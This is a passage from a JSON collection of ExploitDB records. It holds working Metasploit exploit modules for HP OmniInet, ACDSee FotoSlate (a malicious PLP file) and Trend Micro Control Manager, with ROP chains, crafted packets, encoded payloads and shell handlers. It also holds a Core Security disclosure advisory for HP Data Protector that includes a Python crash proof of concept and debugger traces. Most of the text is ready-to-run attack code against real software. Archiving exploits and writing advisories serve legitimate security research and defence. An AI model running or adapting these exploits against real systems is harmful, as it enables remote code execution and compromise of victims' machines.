RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EDI (filler)\r\n\t\t\tnop,         # will be patched at runtime (VP), then picked up into ESI\r\n\t\t\tnop,         # EBX (filler)\r\n\t\t\t0x7c376402,  # POP EBP # RETN (msvcr71.dll)\r\n\t\t\t0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0xfffff82f,  # size 20001 bytes\r\n\t\t\t0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffff,  # pop value into ebx\r\n\t\t\t0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\r\n\t\t\t0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\r\n\t\t\t0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34b8d8,  # ROP NOP (-> edi)\r\n\t\t\t0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\r\n\t\t\t0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x90909090,  # NOPS (-> eax)\r\n\t\t\t0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\r\n\t\t].pack('V*')\r\n\r\n\t\t#Overflowing path \"C:\\Program Files\\OmniBack\\bin\\\"\r\n\t\t#4807 bytes after target.ret, but we need to use less than that to avoid a busted heap\r\n\t\tsploit = ''\r\n\t\tsploit << rand_text_alpha(target['Offset']-sploit.length)\r\n\t\tsploit << [target.ret].pack('V*')\r\n\t\tsploit << rop\r\n\t\tsploit << payload.encoded\r\n\t\tsploit << rand_text_alpha(target['Max']-sploit.length)\r\n\r\n\t\tpkt  = ''\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << \"\\x41\\x41\"  #Length field place holder\r\n\t\tpkt << \"\\xff\\xfe\"\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x32\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 5)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\")\r\n\t\tpkt << Rex::Text.to_unicode(\"20\")  #Opcode\r\n\t\tpkt << \"\\x00\"\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 7)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\\x00\")\r\n\t\tpkt << sploit\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 16)\r\n\r\n\t\t#pkt length\r\n\t\tpkt[2,2] = [pkt.length-5].pack('n')\r\n\r\n\t\tprint_status(\"Sending packet to #{datastore['RHOST']}...\")\r\n\t\tsock.put(pkt)\r\n\r\n\t\t#Data Protector lags before triggering the vuln code\r\n\t\t#Long delay seems necessary to ensure we get a shell back\r\n\t\tselect(nil,nil,nil,20)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\nend",
                "description": "HP OmniInet.exe Opcode 20 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17490,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-07-04T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n  Core Security Technologies - Corelabs Advisory\r\n       http://corelabs.coresecurity.com/\r\n\r\n  HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\n\r\n\r\n1. *Advisory Information*\r\n\r\nTitle: HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\nAdvisory ID: CORE-2011-0606\r\nAdvisory URL:\r\nhttp://www.coresecurity.com/content/HP-Data-Protector-EXECCMD-Vulnerability\r\nDate published: 2011-06-29\r\nDate of last update: 2011-06-29\r\nVendors contacted: HP\r\nRelease mode: Coordinated release\r\n\r\n\r\n2. *Vulnerability Information*\r\n\r\nClass: Remote stack overflow [CWE-120]\r\nImpact: Code execution\r\nRemotely Exploitable: Yes\r\nLocally Exploitable: No\r\nCVE Name: CVE-2011-1866\r\n\r\n\r\n3. *Vulnerability Description*\r\n\r\nHP Data Protector [1] is an automated backup and recovery software for\r\nsingle-server to enterprise environments. A vulnerability in HP Data\r\nProtector could allow a remote attacker to execute arbitrary code. The\r\nvulnerability is triggered by sending a request to port 5555 of a host\r\nrunning the \"data protector inet\" service, part of HP Data Protector.\r\n\r\n\r\n4. *Vulnerable packages*\r\n\r\n   . HP OpenView Storage Data Protector v6.20 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.11 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.10 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.00 (running on Windows).\r\n   . Previous versions may be affected, but were not tested.\r\n\r\n\r\n5. *Non-vulnerable packages*\r\n\r\n   . No fixes are available at the time of publication.\r\n\r\n\r\n6. *Vendor Information, Solutions and Workarounds*\r\n\r\nHP has issued a security bulletin with document ID c02872182 [2]\r\navailable through HP Support Center at http://www.hp.com/go/HPSC.\r\n\r\nThe latest version of HP Data Protector is vulnerable to this issue. HP\r\nhas provided the following procedure to mitigate this vulnerability:\r\n\r\n   1. Upgrade to Data Protector A.06.20 or subsequent.\r\n   2. Enable encrypted control communication services on cell server and\r\nall clients in cell.\r\n\r\n The upgrade is available for download from\r\nhttp://hp.com/go/dataprotector then under 'Product Information' click on\r\n'Trials and Demos'.\r\n\r\n\r\n7. *Credits*\r\n\r\nThis vulnerability was discovered and researched by Nahuel C. Riva from\r\nCore Security Technologies. Publication was coordinated by Carlos Sarraute.\r\n\r\n\r\n8. *Technical Description / Proof of Concept Code*\r\n\r\nThe following python script can be used to reproduce the bug.\r\n\r\n/-----\r\nimport sys\r\nimport socket\r\n\r\nfrom struct import pack\r\n\r\nip = sys.argv[1]\r\nport = int(sys.argv[2]) # default tcp port 5555\r\n\r\ntarget = (ip, port)\r\n\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(target)\r\n\r\npath = 'A' * 5000\r\n\r\npacket =  pack('<L', 0x20003220)\r\npacket += pack('<L', 0x00302000)\r\npacket += '\\x20'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('<L', 0x00432000)\r\npacket += pack('<L', 0x00303220)\r\npacket += '\\x20'\r\npacket += 'omnicheck.exe'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('>H', 0x0020) * 4\r\npacket += pack('<L', 0x30200030)\r\npacket += pack('>H', 0x0020)\r\npacket += path\r\npacket += pack('>H', 0x0000)\r\n\r\nplen = pack('>L', len(packet))\r\n\r\ns.send(plen + packet)\r\n\r\n- -----/\r\n By executing this script, the omniinet.exe process crashes in the\r\nfollowing EIP:\r\n\r\n/-----\r\n7C8285D3    8B0424           MOV EAX,DWORD PTR SS:[ESP]\r\n7C8285D6    8BE5             MOV ESP,EBP\r\n7C8285D8    5D               POP EBP\r\n7C8285D9    C3               RETN\r\n        \r\n- -----/\r\n This is part of a function inside the ntdll.dll library, however, if we\r\nlook the SEH chain, we can see that the SEH handler was overwritten with\r\nthe value 0x00410041 (the unicode value for \"AA\"):\r\n\r\n/-----\r\nSEH chain of thread 00000578\r\nAddress    SE handler\r\n009AFF94   omniinet.00410041\r\n00410041   A3004472\r\n        \r\n- -----/\r\n The following are the values of the CPU registers at the time of the\r\ncrash:\r\n\r\n/-----\r\nEAX C0000008\r\nECX 009AEC98\r\nEDX 7C82859C ntdll.KiRaiseUserExceptionDispatcher\r\nEBX 0015B480\r\nESP 009AEC44\r\nEBP 009AEC94\r\nESI 00155A80\r\nEDI 00000000\r\nEIP 7C8285D3 ntdll.7C8285D3\r\nC 0  ES 0023 32bit 0(FFFFFFFF)\r\nP 1  CS 001B 32bit 0(FFFFFFFF)\r\nA 0  SS 0023 32bit 0(FFFFFFFF)\r\nZ 0  DS 0023 32bit 0(FFFFFFFF)\r\nS 0  FS 003B 32bit 7FFDB000(FFF)\r\nT 0  GS 0000 NULL\r\nD 0\r\nO 0  LastErr ERROR_SUCCESS (00000000)\r\nEFL 00000206 (NO,NB,NE,A,NS,PE,GE,G)\r\nST0 empty 0.0\r\nST1 empty 0.0\r\nST2 empty 0.0\r\nST3 empty 0.0\r\nST4 empty 0.0\r\nST5 empty 0.0\r\nST6 empty 0.7610000000000000098\r\nST7 empty 1.0000000000000000000\r\n               3 2 1 0      E S P U O Z D I\r\nFST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)\r\nFCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1\r\n        \r\n- -----/\r\n The problem is in the 0041D170 function. This function does a blind\r\ncopy of the string passed in the packet as a path:\r\n\r\n/-----\r\n0041D170     /$ 55             PUSH EBP\r\n0041D171     |. 8BEC           MOV EBP,ESP\r\n0041D173     |. 51             PUSH ECX\r\n0041D174     |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D177     |. 8945 FC        MOV DWORD PTR SS:[EBP-4],EAX\r\n0041D17A     |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]\r\n0041D17D     |. 0FB711         MOVZX EDX,WORD PTR DS:[ECX]\r\n0041D180     |. 85D2           TEST EDX,EDX\r\n0041D182     |. 74 73          JE SHORT omniinet.0041D1F7\r\n[...]\r\n0041D1F7     |> 8B45 0C        /MOV EAX,DWORD PTR SS:[EBP+C]\r\n0041D1FA     |. 0FB708         |MOVZX ECX,WORD PTR DS:[EAX]\r\n0041D1FD     |. 85C9           |TEST ECX,ECX\r\n0041D1FF     |. 74 26          |JE SHORT omniinet.0041D227\r\n0041D201     |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D204     |. 8955 FC        |MOV DWORD PTR SS:[EBP-4],EDX\r\n0041D207     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D20A     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D20D     |. 66:8B11        |MOV DX,WORD PTR DS:[ECX]\r\n0041D210     |. 66:8910        |MOV WORD PTR DS:[EAX],DX // copy WORDs\r\nto the stack\r\n0041D213     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D216     |. 83C0 02        |ADD EAX,2\r\n0041D219     |. 8945 08        |MOV DWORD PTR SS:[EBP+8],EAX\r\n0041D21C     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D21F     |. 83C1 02        |ADD ECX,2\r\n0041D222     |. 894D 0C        |MOV DWORD PTR SS:[EBP+C],ECX\r\n0041D225     |.^EB D0          \\JMP SHORT omniinet.0041D1F7\r\n0041D227     |> 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D22A     |. 66:C702 0000   MOV WORD PTR DS:[EDX],0\r\n0041D22F     |. 8B45 FC        MOV EAX,DWORD PTR SS:[EBP-4]\r\n0041D232     |. 8BE5           MOV ESP,EBP\r\n0041D234     |. 5D             POP EBP\r\n0041D235     \\. C3             RETN\r\n        \r\n- -----/\r\n\r\n\r\n\r\n9. *Report Timeline*\r\n\r\n. 2011-06-06:\r\nCore Security Technologies notifies the HP team of the vulnerabilities\r\nand provides the technical details. Publication date is temporarily set\r\nto July 5th, 2011.\r\n\r\n. 2011-06-06:\r\nVendor confirms that a new case was assigned within HP Software Security\r\nResponse Team (SSRT).\r\n\r\n. 2011-06-16:\r\nCore requests an update on this issue, in particular Core asks the\r\nvendor for a technical analysis of the bugs, a list of affected products\r\nand versions, and the vendor's plan for providing a fix (no reply\r\nreceived).\r\n\r\n. 2011-06-23:\r\nCore requests once more an update.\r\n\r\n. 2011-06-28:\r\nVendor communicates that a security bulletin will be issued on the same\r\nday (June 28). The vendor confirms the vulnerabilities, and recommends\r\nas mitigation to enable encrypted communications in the cell server and\r\nclient.\r\n\r\n. 2011-06-28:\r\nCore requests a link to the vendor's bulletin, and asks whether CVE ids\r\nhave been assigned.\r\n\r\n. 2011-06-28:\r\nVendor provides a link to the bulletin and CVE names for the\r\nvulnerabilities.\r\n\r\n. 2011-06-29:\r\nAdvisory CORE-2011-0606 is published.\r\n\r\n\r\n\r\n10. *References*\r\n\r\n[1] HP Data Protector http://hp.com/go/dataprotector\r\n[2] HPSBMU02686 SSRT100541 rev.2 - HP OpenView Storage Data Protector,\r\nRemote Execution of Arbitrary Code\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182\r\n\r\n\r\n11. *About CoreLabs*\r\n\r\nCoreLabs, the research center of Core Security Technologies, is charged\r\nwith anticipating the future needs and requirements for information\r\nsecurity technologies. We conduct our research in several important\r\nareas of computer security including system vulnerabilities, cyber\r\nattack planning and simulation, source code auditing, and cryptography.\r\nOur results include problem formalization, identification of\r\nvulnerabilities, novel solutions and prototypes for new technologies.\r\nCoreLabs regularly publishes security advisories, technical papers,\r\nproject information and shared software tools for public use at:\r\nhttp://corelabs.coresecurity.com.\r\n\r\n\r\n12. *About Core Security Technologies*\r\n\r\nCore Security Technologies enables organizations to get ahead of threats\r\nwith security test and measurement solutions that continuously identify\r\nand demonstrate real-world exposures to their most critical assets. Our\r\ncustomers can gain real visibility into their security standing, real\r\nvalidation of their security controls, and real metrics to more\r\neffectively secure their organizations.\r\n\r\nCore Security's software solutions build on over a decade of trusted\r\nresearch and leading-edge threat expertise from the company's Security\r\nConsulting Services, CoreLabs and Engineering groups. Core Security\r\nTechnologies can be reached at +1 (617) 399-6980 or on the Web at:\r\nhttp://www.coresecurity.com.\r\n\r\n\r\n13. *Disclaimer*\r\n\r\nThe contents of this advisory are copyright (c) 2011 Core Security\r\nTechnologies and (c) 2011 CoreLabs, and are licensed under a Creative\r\nCommons Attribution Non-Commercial Share-Alike 3.0 (United States)\r\nLicense: http://creativecommons.org/licenses/by-nc-sa/3.0/us/\r\n\r\n\r\n14. *PGP/GPG Keys*\r\n\r\nThis advisory has been signed with the GPG key of Core Security\r\nTechnologies advisories team, which is available for download at\r\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.9 (MingW32)\r\n\r\niEYEARECAAYFAk4LnZsACgkQyNibggitWa07/ACfSlzkBvbowAskeP/K4FqtxCay\r\nEAkAnRCPKdc35t5Cb0ZJbGy4me4JRALo\r\n=zHon\r\n-----END PGP SIGNATURE-----",
                "description": "HP Data Protector 6.20 - EXEC_CMD Buffer Overflow",
                "author": "Core Security",
                "_id": 17461,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-06-30T00:00:00+00:00",
                "cve": [
                    "CVE-2011-1866"
                ],
                "type": "dos",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: acdsee_fotoslate_string.rb 13853 2011-10-10 16:47:33Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::FILEFORMAT\r\n\tinclude Msf::Exploit::Remote::Seh\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'ACDSee FotoSlate PLP File id Parameter Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via\r\n\t\t\t\ta specially crafted id parameter in a String element.  When viewing a malicious\r\n\t\t\t\tPLP file with the ACDSee FotoSlate product, a remote attacker could overflow a\r\n\t\t\t\tbuffer and execute arbitrary code. This exploit has been tested on systems such as\r\n\t\t\t\tWindows XP SP3, Windows Vista, and Windows 7.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Parvez Anwar', # Vulnerability discovery\r\n\t\t\t\t\t'juan vazquez'  # Metasploit module\r\n\t\t\t\t],\r\n\t\t\t'Version'        => '$Revision: 13853 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-2595' ],\r\n\t\t\t\t\t[ 'OSVDB', '75425' ],\r\n\t\t\t\t\t[ 'BID', '49558' ],\r\n\t\t\t\t],\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'process',\r\n\t\t\t\t\t'DisablePayloadHandler' => 'true'\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t#'Space'    => 4000,\r\n\t\t\t\t\t'BadChars' => \"\\x00\\x22\"\r\n\t\t\t\t},\r\n\t\t\t'Platform' => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'ACDSee FotoSlate 4.0 Build 146',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'         => 0x263a5b57, # pop, pop, ret from ipwssl6.dll\r\n\t\t\t\t\t\t\t'Offset'      => 1812,\r\n\t\t\t\t\t\t\t'TotalLength' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => 'Sep 12 2011',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOptString.new('FILENAME', [ true, 'The file name.',  'msf.plp']),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\toverflow = rand_text(target[\"Offset\"])\r\n\t\toverflow << generate_seh_record(target.ret)\r\n\t\toverflow << payload.encoded\r\n\t\toverflow << rand_text_alpha(target[\"TotalLength\"] - overflow.length)\r\n\r\n\t\tplp =<<TEMPLATE\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<ACDFotoSlateDocument15>\r\n<PageDefinition>\r\n<Template>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Properties>\r\n<String id=\"#{overflow}\"></String>\r\n<String id=\"Width\">8.500000IN</String>\r\n<String id=\"Height\">11.000000IN</String>\r\n<String id=\"Orientation\">Portrait</String>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Bool id=\"AutoFill\">FALSE</Bool>\r\n</Properties>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Properties>\r\n<String id=\"XPos\">0.500000IN</String>\r\n<String id=\"YPos\">0.500000IN</String>\r\n<String id=\"Width\">7.500000IN</String>\r\n<String id=\"Height\">10.000000IN</String>\r\n<Float id=\"Tilt\">0.000000</Float>\r\n</Properties>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</Template>\r\n<PageContent>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</PageContent>\r\n</PageDefinition>\r\n</ACDFotoSlateDocument15>\r\nTEMPLATE\r\n\r\n\t\tprint_status(\"Creating '#{datastore['FILENAME']}' file ...\")\r\n\t\tfile_create(plp)\r\n\tend\r\n\r\nend\r\n\r\n\r\n=begin\r\nAfter SEH, we have ~0x23C3 bytes (9155 in decimal) of space for payload. But we need to avoid\r\nusing a long buffer in order to avoid the meterpreter possibly being broken.\r\n=end",
                "description": "ACDSee FotoSlate - '.PLP' File 'id' Local Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17966,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-10-10T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"TrendMicro Control Manger <= v5.5 CmdProcessor.exe Stack Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability in the CmdProcessor.exe component of Trend\r\n\t\t\t\tMicro Control Manger up to version 5.5.\r\n\r\n\t\t\t\t\tThe specific flaw exists within CmdProcessor.exe service running on TCP port\r\n\t\t\t\t20101. The vulnerable function is the CGenericScheduler::AddTask function of\r\n\t\t\t\tcmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet,\r\n\t\t\t\tcontrolled data is copied into a 256-byte stack buffer. This can be exploited\r\n\t\t\t\tto execute remote code under the context of the user.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Luigi Auriemma',  #Initial discovery\r\n\t\t\t\t\t'Blue',            #Metasploit\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t['CVE', '2011-5001'],\r\n\t\t\t\t\t['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-345/']\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars' => \"\\x00\",\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => 'process',\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t# TCM 5.5 cannot be installed in Win2k3 SP0-SP1, Win2k8, or XP\r\n\t\t\t\t\t\t'Windows 2003 Server SP2 (DEP Bypass)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'    => 0x666b34c8, # TMNotify.dll stack pivot\r\n\t\t\t\t\t\t\t'Offset' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Dec 07 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOpt::RPORT(20101)\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef junk\r\n\t\treturn rand_text(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\t#TmUpdate.dll\r\n\t\trop_chain = [\r\n\t\t\t0x668074d4,\t# POP EDX # OR AL,0F6 # RETN\r\n\t\t\t0x3FCD0FFC,\t# Put 00001000 into edx\r\n\t\t\t0x667611b2,\t# ADD EDX,C0330004 # RETN 04\r\n\t\t\t0x667c99e7,\t# POP EBP # RETN [TmUpdate.dll]\r\n\t\t\tjunk,\r\n\t\t\t0x667c99e7,\t# skip 4 bytes [TmUpdate.dll]\r\n\t\t\t0x667e3250,\t# POP EBX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffff,\t# NEG EBX\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6680a1d3,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffc0,\t# Value to negate, will become 0x00000040\r\n\t\t\t0x66812b53,\t# NEG EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667f030a,\t# MOV ECX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667d4c7c,\t# POP EDI # RETN [TmUpdate.dll]\r\n\t\t\t0x667e8003,\t# RETN (ROP NOP) [TmUpdate.dll]\r\n\t\t\t0x667d54d0,\t# POP ESI # RETN [TmUpdate.dll]\r\n\t\t\t0x667baf06,\t# JMP [EAX] [TmUpdate.dll]\r\n\t\t\t0x66833376,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6686115c,\t# ptr to &VirtualAlloc() [IAT TmUpdate.dll]\r\n\t\t\t0x6681ceb3,\t# PUSHAD # RETN [TmUpdate.dll]\r\n\t\t\t0x668382c3,\t# ptr to 'call esp' [TmUpdate.dll]\r\n\t\t].pack('V*')\r\n\t\t#rop chain generated by mona.py\r\n\r\n\t\theader  = \"\\x00\\x00\"\r\n\t\theader << \"\\x13\\x88\"          #size of buffer\r\n\t\theader << rand_text_alpha(9)\r\n\t\theader << \"\\x15\\x09\\x13\"      #opcode\r\n\t\theader << \"\\x00\\x00\\x00\"\r\n\t\theader << rand_text_alpha(25)\r\n\t\theader << \"\\xFE\\xFF\\xFF\\xFF\"  #in instruction #MOV EDI,DWORD PTR DS:[EAX+ECX] #ECX is our buffer and needs to be readable dword\r\n\t\theader << \"\\xFF\\xFF\\xFF\\xFF\"  #after sum with EAX. Pointer from EAX increments by #LEA EAX,DWORD PTR DS:[EAX+EDI+4] and then is saved\r\n\t\theader << \"\\xFF\\xFF\\xF4\\xFF\"  #and used again. We can essentially walk the loop which increments EBX by 1 until we get to 14 which leads\r\n\t\theader << \"\\xFF\\xFF\"          #us to our vulnerable function\r\n\t\theader << rand_text_alpha(1)  #align stack again for rop\r\n\r\n\t\tpay = rop_chain\r\n\t\tpay << make_nops(374 - rop_chain.length)\r\n\t\tpay << \"\\xeb\\x04\"  #Short jmp 0x04\r\n\t\tpay << [target.ret].pack('V')\r\n\t\tpay << payload.encoded\r\n\r\n\t\tsploit = header\r\n\t\tsploit << pay\r\n\r\n\t\tfiller = rand_text_alpha(target['Offset'] - (sploit.length))\r\n\r\n\t\tconnect\r\n\t\tprint_status(\"Sending request...\")\r\n\t\tsock.put(sploit + filler)\r\n\t\thandler\r\n\t\tdisconnect\r\n\r\n\tend\r\n\r\nend",
                "description": "Trend Micro Control Manger 5.5 - 'CmdProcessor.exe' Remote Stack Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18514,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2012-02-23T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
